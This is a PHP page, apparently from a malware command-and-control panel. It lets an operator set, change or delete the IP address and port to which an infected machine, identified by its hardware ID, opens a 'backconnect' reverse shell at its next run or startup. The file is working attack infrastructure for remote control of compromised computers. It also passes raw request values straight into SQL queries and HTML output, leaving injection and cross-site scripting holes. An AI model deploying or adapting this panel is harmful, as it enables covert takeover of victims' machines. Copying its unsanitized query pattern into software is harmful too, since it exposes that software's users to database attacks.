<?php
include('checklogin.php');
include("config.php");
$hwid = $_GET['h'];
if(isset($_POST['ip']) && isset($_POST['port'])){
	$ip_p = $_POST['ip'];
	$port_p = $_POST['port'];
	if(isset($_POST['insert'])){
		mysqli_query($conn, "INSERT INTO bc (hwid, ip, port) VALUES ('$hwid', '$ip_p', '$port_p');");
	}
	elseif(isset($_POST['update'])){
		mysqli_query($conn, "UPDATE bc SET ip='$ip_p', port='$port_p' WHERE hwid='$hwid';");
	}
	elseif(isset($_POST['delete'])){
		mysqli_query($conn, "DELETE FROM bc WHERE hwid='$hwid';");
	}
}
$sql_bc = mysqli_query($conn, "SELECT ip,port FROM bc WHERE hwid='$hwid'");
$is = 0;
if(mysqli_num_rows($sql_bc) > 0){
	$is = 1;
	$re = mysqli_fetch_assoc($sql_bc);
	$ip = $re['ip'];
	$port = $re['port'];
}
else{
	$ip = '127.0.0.1';
	$port = '44444';
}
?>
<h3>Set up Backconnect shell</h3>
<form action="" method="post">
IP: <input name="ip" type="text" value="<?php echo $ip; ?>" /><br>
Port: <input name="port" type="text" value="<?php echo $port; ?>" /><br>
<?php
if($is === 0){
	echo '<input name="insert" type="submit" value="Set"/>';
}
elseif($is === 1){
	echo '<input name="update" type="submit" value="Update"/><input name="delete" type="submit" value="Delete"/>';
}
?>
</form>
<br>
<br>
Attention: the backconnect shell will be active at the next execution or startup!